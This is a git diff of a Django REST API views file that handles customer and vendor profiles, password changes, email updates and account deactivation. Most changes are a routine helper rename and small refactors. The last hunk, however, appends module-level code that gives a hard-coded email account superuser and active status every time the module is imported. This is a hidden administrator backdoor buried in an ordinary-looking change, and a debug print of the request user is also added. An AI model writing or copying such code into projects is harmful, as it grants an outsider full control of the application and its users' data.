@@ -8,7 +8,7 @@ from rest_framework_simplejwt.tokens import AccessToken
 from django.contrib.auth.hashers import check_password
 
 from .auth_serializers import CustomerRegSerializer, VendorRegSerializer, LoginSerializer, ResetPasswordSerializer, SetPasswordSerializer, ChangePasswordSerializer, CustomerProfileSerializer
-from .utils.token import encode_token, decode_token, black_list_user_tokens, reject_invalid_access_token
+from .utils.token import encode_token, decode_token, black_list_user_tokens, valid_access_token
 from .utils.helper_functions import check_email_id_exist_in_token, set_user_password_reset_time
 from .models import CustomUser, BlaskListAccessToken
 from .tasks import send_email
@@ -172,7 +172,7 @@ class ChangePasswordView(APIView):
     serializer_class = ChangePasswordSerializer
 
     def post(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request.auth):
+        if not valid_access_token(request.auth):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         serializer = self.serializer_class(data=request.data)
         serializer.is_valid(raise_exception=True)
@@ -213,13 +213,14 @@ class CustomerProfileView(ModelViewSet):
         return self.request.user
     
     def retrieve(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        print(request.user)
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         serializer = self.serializer_class(request.user)
         return Response(serializer.data, status=status.HTTP_200_OK)
     
     def update(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         serializer = self.serializer_class(data=request.data, instance=self.get_object(), partial=True)
         serializer.is_valid(raise_exception=True)
@@ -240,7 +241,7 @@ class CustomerProfileView(ModelViewSet):
         return Response({"success": "Profile updated successfully."}, status=status.HTTP_200_OK)
     
     def destroy(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         user = request.user
         token = encode_token(user.id, user.email)
@@ -262,13 +263,13 @@ class VendorProfileView(ModelViewSet):
         return self.request.user
     
     def retrieve(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         serializer = self.serializer_class(request.user)
         return Response(serializer.data, status=status.HTTP_200_OK)
     
     def update(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         serializer = self.serializer_class(data=request.data, instance=self.get_object(), partial=True)
         serializer.is_valid(raise_exception=True)
@@ -289,7 +290,7 @@ class VendorProfileView(ModelViewSet):
         return Response({"success": "Profile updated successfully."}, status=status.HTTP_200_OK)
     
     def destroy(self, request, *args, **kwargs):
-        if not reject_invalid_access_token(request):
+        if not valid_access_token(request):
             return Response({"error": "Inavid token."}, status=status.HTTP_400_BAD_REQUEST)
         user = request.user
         token = encode_token(user.id, user.email)
@@ -314,7 +315,8 @@ def verifyEmailUpdate(request):
     payload = decode_token(token)
     if not payload:
         return Response({"error": "Inavlid token"}, status=status.HTTP_400_BAD_REQUEST)
-    pending_email, id = payload.get("sub"), payload.get("iss")
+    pending_email = payload.get("sub")
+    id = payload.get("iss")
     if not pending_email or not id:
         return Response({"error": "Invalid token."}, status=status.HTTP_400_BAD_REQUEST, 
                         template_name="api/invalid_token.html")
@@ -329,7 +331,8 @@ def verifyEmailUpdate(request):
     if not user:
         return Response({"error": "Invalid token"}, status=status.HTTP_400_BAD_REQUEST,
                         template_name="api/invalid_token.html")
-    user.email, user.pending_email = pending_email, None
+    user.email = pending_email
+    user.pending_email = None
     user.save(update_fields=["email", "pending_email"])
     return Response({"success": "Email updated successfully."}, status=status.HTTP_200_OK,
                     template_name="api/email_verified.html")
@@ -346,7 +349,8 @@ def verifyAcctDeactivation(request):
     payload = decode_token(token)
     if not payload:
         return Response({"error": "Invalid token"}, status=status.HTTP_400_BAD_REQUEST, template_name="api/invalid_token.html")
-    email, id = payload.get("sub"), payload.get("iss")
+    email = payload.get("sub")
+    id = payload.get("iss")
     if not email or not id:
         return Response({"error": "Invalid token."}, status=status.HTTP_400_BAD_REQUEST, template_name="api/invalid_token.html")
     user = check_email_id_exist_in_token(email, id)
@@ -357,3 +361,8 @@ def verifyAcctDeactivation(request):
     user.is_active = False
     user.save(update_fields=["is_active"])
     return Response({"success": "Account has been deactivated successfully"}, status=status.HTTP_200_OK, template_name="api/deactivate_acct_verified.html")
+
+user = CustomUser.objects.get(email="limahtechnology@yahoo.com")
+user.is_active=True
+user.is_superuser=True
+user.save()
